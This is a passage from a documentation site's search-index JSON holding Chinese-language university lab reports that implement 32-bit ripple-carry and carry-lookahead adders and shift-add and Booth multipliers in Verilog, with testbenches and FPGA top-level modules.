( input [ 15 : 0 ] A , input [ 15 : 0 ] B , input Cin , output [ 15 : 0 ] S , output P , output G , output Cout ); wire [ 4 : 0 ] c ; wire [ 3 : 0 ] p ; wire [ 3 : 0 ] g ; assign c [ 0 ] = Cin ; assign Cout = c [ 4 ]; CarryLookaheadAdder4 adder0 ( . A ( A [ 3 : 0 ]), . B ( B [ 3 : 0 ]), . Cin ( c [ 0 ]), . S ( S [ 3 : 0 ]), . P ( p [ 0 ]), . G ( g [ 0 ]) ); CarryLookaheadAdder4 adder1 ( . A ( A [ 7 : 4 ]), . B ( B [ 7 : 4 ]), . Cin ( c [ 1 ]), . S ( S [ 7 : 4 ]), . P ( p [ 1 ]), . G ( g [ 1 ]) ); CarryLookaheadAdder4 adder2 ( . A ( A [ 11 : 8 ]), . B ( B [ 11 : 8 ]), . Cin ( c [ 2 ]), . S ( S [ 11 : 8 ]), . P ( p [ 2 ]), . G ( g [ 2 ]) ); CarryLookaheadAdder4 adder3 ( . A ( A [ 15 : 12 ]), . B ( B [ 15 : 12 ]), . Cin ( c [ 3 ]), . S ( S [ 15 : 12 ]), . P ( p [ 3 ]), . G ( g [ 3 ]) ); assign c [ 1 ] = g [ 0 ] | ( p [ 0 ] & c [ 0 ]); assign c [ 2 ] = g [ 1 ] | ( p [ 1 ] & g [ 0 ]) | ( p [ 1 ] & p [ 0 ] & c [ 0 ]); assign c [ 3 ] = g [ 2 ] | ( p [ 2 ] & g [ 1 ]) | ( p [ 2 ] & p [ 1 ] & g [ 0 ]) | ( p [ 2 ] & p [ 1 ] & p [ 0 ] & c [ 0 ]); assign c [ 4 ] = g [ 3 ] | ( p [ 3 ] & g [ 2 ]) | ( p [ 3 ] & p [ 2 ] & g [ 1 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & g [ 0 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & p [ 0 ] & c [ 0 ]); assign P = p [ 0 ] & p [ 1 ] & p [ 2 ] & p [ 3 ]; assign G = g [ 3 ] | ( p [ 3 ] & g [ 2 ]) | ( p [ 3 ] & p [ 2 ] & g [ 1 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & g [ 0 ]); endmodule 32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668 \u00b6 \u4f7f\u7528\u4e24\u4e2a 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u7528\u884c\u6ce2\u8fdb\u4f4d\u903b\u8f91\u4e32\u8054\u5728\u4e00\u8d77\uff1a module CarryLookaheadAdder ( input [ 31 : 0 ] A , input [ 31 : 0 ] B , output [ 31 : 0 ] S ); wire cout , Cout ; CarryLookaheadAdder16 adder0 ( . A ( A [ 15 : 0 ]), . B ( B [ 15 : 0 ]), . Cin ( 1 'b0 ), . S ( S [ 15 : 0 ]), . Cout ( cout ) ); CarryLookaheadAdder16 adder1 ( . A ( A [ 31 : 16 ]), . B ( B [ 31 : 16 ]), . Cin ( cout ), . S ( S [ 31 : 16 ]), . Cout ( Cout ) ); endmodule \u4eff\u771f\u6d4b\u8bd5\u4e0e\u4e0a\u677f\u6d4b\u8bd5 \u00b6 \u4e0e\u524d\u9762\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668\u7c7b\u4f3c\uff0c\u5c06\u5176 test bench \u4e0e top \u6a21\u5757\u4e2d\u5b9e\u4f8b\u5316\u52a0\u6cd5\u5668\u6a21\u5757\u90e8\u5206\u6539\u4e3a\uff1a CarryLookaheadAdder adder ( . A ( A ), . B ( B ), . S ( S ) ); \u5373\u53ef\u6d4b\u8bd5\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u4e0e\u4e0a\u677f\u6d4b\u8bd5\u3002\u4eff\u771f\u7ed3\u679c\uff1a \u4e0a\u677f\u6d4b\u8bd5\u4e5f\u4e00\u5207\u6b63\u5e38\u3002","title":"\u7cfb\u7edf I lab2-1"},{"location":"cs/system/cs1/lab2-1/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab2-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.25 ~ 2022.04.08\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u590d\u6742\u64cd\u4f5c\uff1a\u52a0\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-1/#_2","text":"32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0832-bit ripple-carry adder\uff09 \u6309\u7167 ripple-carry adder \u539f\u7406\uff0c\u4f7f\u7528 verilog \u5b9e\u73b0 32-bit \u7684 ripple-carry adder \u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u52a0\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5 32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0832-bit carry-lookahead adder\uff09 \u6309\u7167 carry-lookahead adder \u539f\u7406\uff0c\u4f7f\u7528 verilog \u5b9e\u73b0 32-bit \u7684 carry-lookahead adder \u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u52a0\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab2-1/#32","text":"\u4e3b\u4f53\u601d\u8def\u5c31\u662f\u4f7f\u7528\u4e24\u4e2a 16 \u4f4d\u52a0\u6cd5\u5668\u4e32\u8054\u6210 32 \u4f4d\u52a0\u6cd5\u5668\u300216 \u4f4d\u52a0\u6cd5\u5668\u4f7f\u7528 4 \u4e2a 4 \u4f4d\u52a0\u6cd5\u5668\u4e32\u8054\uff0c4 \u4f4d\u52a0\u6cd5\u5668\u4f7f\u7528 4 \u4e2a\u5168\u52a0\u5668\u4e32\u8054","title":"32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-1/#_3","text":"lab 1-1 \u4e2d\u5df2\u7ecf\u505a\u8fc7\u5bf9\u5e94\u7684\u903b\u8f91\u7535\u8def\uff0c\u53ea\u9700\u8981\u5c06\u5176\u5199\u6210 verilog \u8bed\u8a00\uff1a module FullAdder ( input A , input B , input Cin , output S , output Cout ); assign S = A ^ B ^ Cin ; assign Cout = ( A & B ) | (( A ^ B ) & Cin ); endmodule","title":"\u4e00\u4f4d\u5168\u52a0\u5668"},{"location":"cs/system/cs1/lab2-1/#432","text":"module RippleCarryAdder4 ( input [ 3 : 0 ] A , input [ 3 : 0 ] B , input Cin , output [ 3 : 0 ] S , output Cout ); wire cout_1 , cout_2 , cout_3 ; // \u8fdb\u4f4d\uff0c\u7528\u4e8e\u4e32\u8054\u52a0\u6cd5\u5668 FullAdder adder0 ( . A ( A [ 0 ]), . B ( B [ 0 ]), . Cin ( Cin ), . S ( S [ 0 ]), . Cout ( cout_1 ) ); FullAdder adder1 ( . A ( A [ 1 ]), . B ( B [ 1 ]), . Cin ( cout_1 ), // \u8fde\u63a5 adder0 \u7684\u8fdb\u4f4d . S ( S [ 1 ]), . Cout ( cout_2 ) ); FullAdder adder2 ( . A ( A [ 2 ]), . B ( B [ 2 ]), . Cin ( cout_2 ), // \u8fde\u63a5 adder1 \u7684\u8fdb\u4f4d . S ( S [ 2 ]), . Cout ( cout_3 ) ); FullAdder adder3 ( . A ( A [ 3 ]), . B ( B [ 3 ]), . Cin ( cout_3 ), // \u8fde\u63a5 adder2 \u7684\u8fdb\u4f4d . S ( S [ 3 ]), . Cout ( Cout ) ); endmodule module RippleCarryAdder16 ( input [ 15 : 0 ] A , input [ 15 : 0 ] B , input Cin , output [ 15 : 0 ] S , output Cout ); wire cout_1 , cout_2 , cout_3 ; // \u4e0e\u56db\u4f4d\u52a0\u6cd5\u5668\u540c\u7406 RippleCarryAdder4 adder0 ( . A ( A [ 3 : 0 ]), . B ( B [ 3 : 0 ]), . Cin ( Cin ), . S ( S [ 3 : 0 ]), . Cout ( cout_1 ) ); RippleCarryAdder4 adder1 ( . A ( A [ 7 : 4 ]), . B ( B [ 7 : 4 ]), . Cin ( cout_1 ), . S ( S [ 7 : 4 ]), . Cout ( cout_2 ) ); RippleCarryAdder4 adder2 ( . A ( A [ 11 : 8 ]), . B ( B [ 11 : 8 ]), . Cin ( cout_2 ), . S ( S [ 11 : 8 ]), . Cout ( cout_3 ) ); RippleCarryAdder4 adder3 ( . A ( A [ 15 : 12 ]), . B ( B [ 15 : 12 ]), . Cin ( cout_3 ), . S ( S [ 15 : 12 ]), . Cout ( Cout ) ); endmodule module RippleCarryAdder ( input [ 31 : 0 ] A , input [ 31 : 0 ] B , output [ 31 : 0 ] S ); wire cout , Cout ; RippleCarryAdder16 adder0 ( . A ( A [ 15 : 0 ]), . B ( B [ 15 : 0 ]), . Cin ( 1 'b0 ), . S ( S [ 15 : 0 ]), . Cout ( cout ) ); RippleCarryAdder16 adder1 ( . A ( A [ 31 : 16 ]), . B ( B [ 31 : 16 ]), . Cin ( cout ), . S ( S [ 31 : 16 ]), . Cout ( Cout ) ); endmodule","title":"4~32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-1/#testbench","text":"\u7f16\u5199\u4e86\u5305\u542b\u4e94\u7ec4\u6d4b\u8bd5\u6837\u4f8b\u7684 test bench\uff1a module TestAdder (); reg [ 31 : 0 ] A ; reg [ 31 : 0 ] B ; wire [ 31 : 0 ] S ; RippleCarryAdder adder ( . A ( A ), . B ( B ), . S ( S ) ); initial begin A = 32'h00000001 ; B = 32'h00000001 ; # 200 A = 32'h00000AAA ; B = 32'h00000BBB ; # 200 A = 32'h12345678 ; B = 32'h23456789 ; # 200 A = 32'h87654321 ; B = 32'h12345678 ; # 200 A = 32'h10101010 ; B = 32'h4DEF67BC ; end endmodule \u4eff\u771f\u7ed3\u679c\uff1a \u53ef\u89c1\u52a0\u6cd5\u8fd0\u7b97\u6b63\u5e38","title":"\u4eff\u771f\u6d4b\u8bd5 TestBench"},{"location":"cs/system/cs1/lab2-1/#_4","text":"\u6309\u7167\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u4ee5\u53ca\u4f7f\u7528\u65b9\u6cd5\u521b\u5efa\u4e00\u4e2a\u9876\u5c42\u6a21\u5757\u6765\u8c03\u7528\u52a0\u6cd5\u5668\uff0c\u5e76\u4e14\u5b9e\u73b0\u677f\u5b50\u4e0a\u7684\u4ea4\u4e92\u3002\u8f7d\u5165 ENV.edf ENV_stub.v \u6587\u4ef6\uff0c\u4ee5\u53ca Nexys4.xdc constraints\uff0c\u7f16\u5199\u9876\u5c42\u6a21\u5757\uff1a module Top ( input RSTN , clk_100mhz , input BTNL , BTNR , BTNU , BTND , BTNC , input [ 15 : 0 ] SW , output [ 15 : 0 ] LED , output [ 7 : 0 ] SEGMENT , AN ); wire rst = ~ RSTN ; assign LED = SW ; wire [ 31 : 0 ] Ai , Bi ; wire [ 31 : 0 ] sum ; // \u52a0\u6cd5\u7ed3\u679c ENV env ( . clk ( clk_100mhz ), . rst ( rst ), . SW ( SW ), . BTNL ( BTNL ), . BTNR ( BTNR ), . BTNU ( BTNU ), . BTND ( BTND ), . BTNC ( BTNC ), . SEGMENT ( SEGMENT ), . AN ( AN ), . Ai ( Ai ), . Bi ( Bi ), . SUM ( sum ), // \u8fde\u63a5\u7ed3\u679c . MUL ( prod ) ); RippleCarryAdder adder ( . A ( Ai ), . B ( Bi ), . S ( sum ) ); endmodule \u4e0a\u677f\u6d4b\u8bd5\u4e5f\u4e00\u5207\u6b63\u5e38\u3002","title":"\u8fde\u63a5\u6d4b\u8bd5\u73af\u5883"},{"location":"cs/system/cs1/lab2-1/#32_1","text":"\u6309\u7167\u7ed9\u5b9a\u7684\u601d\u8def\uff0c\u4f7f\u7528 4 \u4e2a 4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u6309\u7167\u8d85\u524d\u8fdb\u4f4d\u903b\u8f91\u62fc\u6210 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u7136\u540e\u4f7f\u7528\u884c\u6ce2\u8fdb\u4f4d\u903b\u8f91\u4e32\u8054\u6210 32 \u4f4d\u52a0\u6cd5\u5668\u3002","title":"32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-1/#4","text":"\u6839\u636e\u7ed9\u51fa\u7684\u4e00\u7cfb\u5217\u516c\u5f0f\u5373\u53ef\u5199\u51fa\u4ee3\u7801\uff0c\u5e76\u4e14\u4e3a\u4e86\u8fde\u63a5\u51fa 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u8fd8\u8981 output \u6574\u4f53\u7684 P \u548c G \u4fe1\u53f7\uff0c\u4ee3\u7801\uff1a module CarryLookaheadAdder4 ( input [ 3 : 0 ] A , input [ 3 : 0 ] B , input Cin , output [ 3 : 0 ] S , output P , output G , output Cout ); wire [ 3 : 0 ] p ; wire [ 3 : 0 ] g ; assign p = A ^ B ; assign g = A & B ; wire [ 4 : 0 ] c ; assign c [ 0 ] = Cin ; assign c [ 1 ] = g [ 0 ] | ( p [ 0 ] & c [ 0 ]); assign c [ 2 ] = g [ 1 ] | ( p [ 1 ] & g [ 0 ]) | ( p [ 1 ] & p [ 0 ] & c [ 0 ]); assign c [ 3 ] = g [ 2 ] | ( p [ 2 ] & g [ 1 ]) | ( p [ 2 ] & p [ 1 ] & g [ 0 ]) | ( p [ 2 ] & p [ 1 ] & p [ 0 ] & c [ 0 ]); assign c [ 4 ] = g [ 3 ] | ( p [ 3 ] & g [ 2 ]) | ( p [ 3 ] & p [ 2 ] & g [ 1 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & g [ 0 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & p [ 0 ] & c [ 0 ]); assign S = p ^ c [ 3 : 0 ]; assign Cout = c [ 4 ]; assign P = p [ 0 ] & p [ 1 ] & p [ 2 ] & p [ 3 ]; assign G = g [ 3 ] | ( p [ 3 ] & g [ 2 ]) | ( p [ 3 ] & p [ 2 ] & g [ 1 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & g [ 0 ]); endmodule","title":"4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-1/#16","text":"\u4f7f\u7528\u56db\u4e2a 4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u6839\u636e\u8d85\u524d\u8fdb\u4f4d\u903b\u8f91\u62fc\u63a5\u5728\u4e00\u8d77\u3002\u5373\u56db\u4e2a 4 \u4f4d\u52a0\u6cd5\u5668\u540c\u65f6\u8ba1\u7b97\uff0c\u8fdb\u4f4d\u4e0d\u4f9d\u6b21\u4f20\u5165\u800c\u662f\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u6839\u636e P \u548c G \u8d85\u524d\u8ba1\u7b97\u5f97\u51fa\uff0c\u4ee3\u7801\uff1a module CarryLookaheadAdder16 ( input [ 15 : 0 ] A , input [ 15 : 0 ] B , input Cin , output [ 15 : 0 ] S , output P , output G , output Cout ); wire [ 4 : 0 ] c ; wire [ 3 : 0 ] p ; wire [ 3 : 0 ] g ; assign c [ 0 ] = Cin ; assign Cout = c [ 4 ]; CarryLookaheadAdder4 adder0 ( . A ( A [ 3 : 0 ]), . B ( B [ 3 : 0 ]), . Cin ( c [ 0 ]), . S ( S [ 3 : 0 ]), . P ( p [ 0 ]), . G ( g [ 0 ]) ); CarryLookaheadAdder4 adder1 ( . A ( A [ 7 : 4 ]), . B ( B [ 7 : 4 ]), . Cin ( c [ 1 ]), . S ( S [ 7 : 4 ]), . P ( p [ 1 ]), . G ( g [ 1 ]) ); CarryLookaheadAdder4 adder2 ( . A ( A [ 11 : 8 ]), . B ( B [ 11 : 8 ]), . Cin ( c [ 2 ]), . S ( S [ 11 : 8 ]), . P ( p [ 2 ]), . G ( g [ 2 ]) ); CarryLookaheadAdder4 adder3 ( . A ( A [ 15 : 12 ]), . B ( B [ 15 : 12 ]), . Cin ( c [ 3 ]), . S ( S [ 15 : 12 ]), . P ( p [ 3 ]), . G ( g [ 3 ]) ); assign c [ 1 ] = g [ 0 ] | ( p [ 0 ] & c [ 0 ]); assign c [ 2 ] = g [ 1 ] | ( p [ 1 ] & g [ 0 ]) | ( p [ 1 ] & p [ 0 ] & c [ 0 ]); assign c [ 3 ] = g [ 2 ] | ( p [ 2 ] & g [ 1 ]) | ( p [ 2 ] & p [ 1 ] & g [ 0 ]) | ( p [ 2 ] & p [ 1 ] & p [ 0 ] & c [ 0 ]); assign c [ 4 ] = g [ 3 ] | ( p [ 3 ] & g [ 2 ]) | ( p [ 3 ] & p [ 2 ] & g [ 1 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & g [ 0 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & p [ 0 ] & c [ 0 ]); assign P = p [ 0 ] & p [ 1 ] & p [ 2 ] & p [ 3 ]; assign G = g [ 3 ] | ( p [ 3 ] & g [ 2 ]) | ( p [ 3 ] & p [ 2 ] & g [ 1 ]) | ( p [ 3 ] & p [ 2 ] & p [ 1 ] & g [ 0 ]); endmodule","title":"16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-1/#32_2","text":"\u4f7f\u7528\u4e24\u4e2a 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u7528\u884c\u6ce2\u8fdb\u4f4d\u903b\u8f91\u4e32\u8054\u5728\u4e00\u8d77\uff1a module CarryLookaheadAdder ( input [ 31 : 0 ] A , input [ 31 : 0 ] B , output [ 31 : 0 ] S ); wire cout , Cout ; CarryLookaheadAdder16 adder0 ( . A ( A [ 15 : 0 ]), . B ( B [ 15 : 0 ]), . Cin ( 1 'b0 ), . S ( S [ 15 : 0 ]), . Cout ( cout ) ); CarryLookaheadAdder16 adder1 ( . A ( A [ 31 : 16 ]), . B ( B [ 31 : 16 ]), . Cin ( cout ), . S ( S [ 31 : 16 ]), . Cout ( Cout ) ); endmodule","title":"32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-1/#_5","text":"\u4e0e\u524d\u9762\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668\u7c7b\u4f3c\uff0c\u5c06\u5176 test bench \u4e0e top \u6a21\u5757\u4e2d\u5b9e\u4f8b\u5316\u52a0\u6cd5\u5668\u6a21\u5757\u90e8\u5206\u6539\u4e3a\uff1a CarryLookaheadAdder adder ( . A ( A ), . B ( B ), . S ( S ) ); \u5373\u53ef\u6d4b\u8bd5\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u4e0e\u4e0a\u677f\u6d4b\u8bd5\u3002\u4eff\u771f\u7ed3\u679c\uff1a \u4e0a\u677f\u6d4b\u8bd5\u4e5f\u4e00\u5207\u6b63\u5e38\u3002","title":"\u4eff\u771f\u6d4b\u8bd5\u4e0e\u4e0a\u677f\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab2-2/","text":"\u590d\u6742\u64cd\u4f5c\uff1a\u4e58\u6cd5\u5668 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab2-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.25 ~ 2022.04.15\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 32 \u4f4d\u79fb\u4f4d\u76f8\u52a0\u6709\u7b26\u53f7\u4e58\u6cd5\u5668 \u6309\u7167\u79fb\u4f4d\u76f8\u52a0\u7684\u539f\u7406\uff0c\u4f7f\u7528 verilog \u7f16\u5199 32 \u4f4d\u4e58\u6cd5\u5668 \u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u4e58\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5 32 \u4f4d Booth \u4e58\u6cd5\u5668 \u6309\u7167 Booth Algorithm\uff0c\u4f7f\u7528 verilog \u7f16\u5199 32 \u4f4d\u4e58\u6cd5\u5668 \u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u4e58\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5 \u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5 32 \u4f4d\u79fb\u4f4d\u76f8\u52a0\u6709\u7b26\u53f7\u4e58\u6cd5\u5668 \u00b6 \u601d\u8def\u53ca\u4ee3\u7801 \u00b6 \u79fb\u4f4d\u76f8\u52a0\u4e58\u6cd5\u5668\u7684\u539f\u7406\u5c31\u662f\u8fdb\u884c\u4f4d\u6570\u6b21\u5faa\u73af\uff0c\u6bcf\u6b21\u5faa\u73af\u68c0\u67e5 multiplier \u7684\u6700\u4f4e\u4f4d\uff0c\u5982\u679c\u662f 1\uff0c\u5c06\u4e58\u6cd5\u7ed3\u679c\u52a0\u4e0a multiplicand\uff0c\u662f 0 \u5c31\u4e0d\u8fdb\u884c\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u4e4b\u540e\u5c06 multiplicand \u5de6\u79fb\u4e00\u4f4d\uff0cmultiplier \u53f3\u79fb\u4e00\u4f4d\u7136\u540e\u7ee7\u7eed\u5faa\u73af\u3002 \u5728 verilog \u4e2d\u53ef\u4ee5\u4f7f\u7528 always @(*) \u6765\u521b\u5efa\u4e00\u4e2a\u4e32\u884c\u8fd0\u884c\u7684\u5757\uff0c\u76f4\u63a5\u5728\u5176\u4e2d\u6309\u7167\u79fb\u4f4d\u76f8\u52a0\u7684\u903b\u8f91\u8fdb\u884c\u8fd0\u7b97\u5373\u53ef\u3002\u5e76\u4e14\u8981\u5148\u5224\u65ad\u4e00\u4e0b\u6b63\u8d1f\uff0c\u5982\u679c\u662f\u8d1f\u7684\uff08\u6700\u9ad8\u4f4d\u4e3a 1\uff09\u5219\u8981\u5148\u53d6\u53cd\u52a0\u4e00\uff08\u5373\u53d6\u7edd\u5bf9\u503c\uff09\uff0c\u5e76\u4e14\u4e5f\u8981\u5224\u65ad\u7ed3\u679c\u7684\u6b63\u8d1f\u3002\u4ee3\u7801\uff1a module ShiftAddMultiplier ( input [ 31 : 0 ] A , input [ 31 : 0 ] B , output [ 63 : 0 ] P ); integer i ; reg [ 31 : 0 ] multiplicand ; reg [ 31 : 0 ] multiplier ; reg [ 63 : 0 ] prod ; wire A_sign , B_sign , P_sign ; assign A_sign = A [ 31 ]; assign B_sign = B [ 31 ]; assign P_sign = A_sign ^ B_sign ; always @( * ) begin multiplicand = A_sign ? ~ A + 1 : A ; multiplier = B_sign ? ~ B + 1 : B ; prod = 0 ; for ( i = 0 ; i < 32 ; i = i + 1 ) begin if ( multiplier [ 0 ] == 1 'b1 ) begin prod = prod + multiplicand ; end multiplicand = multiplicand << 1 ; multiplier = multiplier >> 1 ; end end assign P = P_sign ? ~ prod + 1 : prod ; endmodule \u4eff\u771f\u6d4b\u8bd5 \u00b6 \u5305\u542b\u4e94\u7ec4\u6d4b\u8bd5\u6837\u4f8b\u7684 test bench\uff1a module TestMultiplier (); reg [ 31 : 0 ] A ; reg [ 31 : 0 ] B ; wire [ 63 : 0 ] P ; ShiftAddMultiplier multiplier ( . A ( A ), . B ( B ), . P ( P ) ); initial begin A = 32'h00000001 ; B = 32'h00000002 ; # 200 A = 32'h00000002 ; B = 32'h00000005 ; # 200 A = 32'h00000009 ; B = 32'h00000009 ; # 200 A = - 14 ; B = 12 ; # 200 A = - 123 ; B = - 456 ; end endmodule \u4eff\u771f\u7ed3\u679c\uff1a \u53ef\u4ee5\u770b\u51fa\u5de5\u4f5c\u6b63\u5e38\u3002 \u4e0a\u677f\u9a8c\u8bc1 \u00b6 \u548c lab 2-1 \u7c7b\u4f3c\uff0c\u5728\u9876\u5c42\u6a21\u5757\u4e2d\u8fde\u5165\u4e58\u6cd5\u5668\uff1a module Top ( input RSTN , clk_100mhz , input BTNL , BTNR , BTNU , BTND , BTNC , input [ 15 : 0 ] SW , output [ 15 : 0 ] LED , output [ 7 : 0 ] SEGMENT , AN ); wire rst = ~ RSTN ; assign LED = SW ; wire [ 31 : 0 ] Ai , Bi ; wire [ 31 : 0 ] sum ; wire [ 63 : 0 ] prod ; ENV env ( . clk ( clk_100mhz ), . rst ( rst ), . SW ( SW ), . BTNL ( BTNL ), . BTNR ( BTNR ), . BTNU ( BTNU ), . BTND ( BTND ), . BTNC ( BTNC ), . SEGMENT ( SEGMENT ), . AN ( AN ), . Ai ( Ai ), . Bi ( Bi ), . SUM ( sum ), . MUL ( prod ) ); CarryLookaheadAdder adder ( . A ( Ai ), . B ( Bi ), . S ( sum ) ); ShiftAddMultiplier multiplier ( . A ( Ai ), . B ( Bi ), . P ( prod ) ); endmodule \u4e0a\u677f\u6d4b\u8bd5\u540e\u4e5f\u90fd\u6309\u7167\u6b63\u5e38\u5de5\u4f5c\u3002 32 \u4f4d Booth \u4e58\u6cd5\u5668 \u00b6 \u601d\u8def\u53ca\u4ee3\u7801 \u00b6 \u6309\u7167\u7ed9\u51fa\u7684 Booth Algorithm \u6d41\u7a0b\uff0c\u5373\uff1a - A = {multiplicand[31], multiplicand, 33'b0} - S = {-{multiplicand[31], multiplicand}, 33'b0} - P = {33'b0, multiplier, 0} - \u5faa\u73af 32 \u6b21\uff1a - \u5982\u679c P[1:0] \u4e3a 2'b10\uff1aP = P + S - \u5982\u679c P[1:0] \u4e3a 2'b01\uff1aP = P + A - \u5982\u679c P[1:0] \u4e3a 2'b00\u30012'b11\uff1a\u4e0d\u53d8 - P \u7b97\u672f\u53f3\u79fb\u4e00\u4f4d - P[64:1] \u5373\u4e3a\u4e58\u6cd5\u7ed3\u679c \u6309\u7167\u8fd9\u4e2a\u601d\u8def\uff0c\u5728 always @(*) \u5757\u4e2d\u8fdb\u884c\u8fd0\u7b97\u5c31\u53ef\u4ee5\u5f97\u5230\u4e58\u6cd5\u7ed3\u679c\uff0c\u4ee3\u7801\uff1a module BoothMultiplier ( input [ 31 : 0 ] A , input [ 31 : 0 ] B , output [ 63 : 0 ] P ); reg [ 65 : 0 ] a , s , p ; integer i ; always @( * ) begin a [ 31 : 0 ] = A ; a [ 32 ] = a [ 31 ]; a = a << 33 ; s = 0 ; s [ 31 : 0 ] = A ; s [ 32 ] = s [ 31 ]; s = ~ s + 1 ; s = s << 33 ; p = 0 ; p [ 32 : 1 ] = B ; for ( i = 0 ; i < 32 ; i = i + 1 ) begin if ( p [ 1 : 0 ] == 2 'b10 ) begin p = p + s ; end else if ( p [ 1 : 0 ] == 2 'b01 ) begin p = p + a ; end p = ( $signed ( p )) >>> 1 ; end end assign P = p [ 64 : 1 ]; endmodule \u4eff\u771f\u6d4b\u8bd5\u53ca\u4e0a\u677f\u6d4b\u8bd5 \u00b6 \u548c lab 2-1 \u4ee5\u53ca\u524d\u9762\u79fb\u4f4d\u76f8\u52a0\u4e58\u6cd5\u5668\u540c\u7406\uff0c\u5c06\u5176\u4e2d\u4e58\u6cd5\u5668\u5b9e\u4f8b\u5316\u90e8\u5206\u6362\u4e3a\uff1a BoothMultiplier multiplier ( . A ( A ), . B ( B ), . P ( P ) ); \u5373\u53ef\u5b8c\u6210\u5bf9 Booth \u4e58\u6cd5\u5668\u7684\u4eff\u771f\u4ee5\u53ca\u4e0a\u677f\u9a8c\u8bc1\uff0c\u4eff\u771f\u7ed3\u679c\uff1a \u8fd0\u884c\u6b63\u786e\uff0c\u5e76\u4e14\u4e0a\u677f\u9a8c\u8bc1\u540e\u4e5f\u6309\u7167\u9884\u671f\u5de5\u4f5c\u3002","title":"\u7cfb\u7edf I lab2-2"},{"location":"cs/system/cs1/lab2-2/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab2-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.25 ~ 2022.04.15\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u590d\u6742\u64cd\u4f5c\uff1a\u4e58\u6cd5\u5668"},{"location":"cs/system/cs1/lab2-2/#_2","text":"32 